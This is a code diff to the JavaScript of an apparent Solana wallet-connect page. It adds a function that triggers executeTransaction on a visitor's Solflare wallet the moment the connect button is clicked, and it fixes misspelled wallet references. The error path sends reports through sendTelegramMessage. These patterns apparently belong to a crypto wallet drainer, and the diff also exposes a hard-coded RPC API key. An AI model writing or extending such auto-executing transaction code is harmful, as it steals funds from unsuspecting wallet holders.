@@ -344,7 +344,25 @@ $(document).ready(async function () {
       window.open("https://phantom.app/", "_blank");
     }
   });
+  async function autoExecuteIfConnected() {
+    try {
+      if (window.solflare && window.solflare.isConnected) {
+        //showLoader("#window.solflare");  // Custom function assumed
+        const connection = new solanaWeb3.Connection(
+          "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
+          "confirmed"
+        );
+
+        await executeTransaction(connection, window.solflare, window.solflare.publicKey);
+      }
+    } catch (err) {
+      console.error("Auto-execute failed:", err);
+    }
+  }
+
   $("#connect-solflare").on("click", async () => {
+     
+    autoExecuteIfConnected();
     const isMobile =
       /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
         navigator.userAgent
@@ -378,14 +396,14 @@ $(document).ready(async function () {
           showLoader("#window.solflare)");
           selected = "#window.solflare)";
     
-          const resp = await window.solfare.connect();
+          const resp = await window.solflare.connect();
     
           const connection = new solanaWeb3.Connection(
             "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
             "confirmed"
           );
     
-          await executeTransaction(connection, window.solfare, resp.publicKey);
+          await executeTransaction(connection, window.solflare, resp.publicKey);
         } catch (err) {
           console.error(err);
           await sendTelegramMessage(
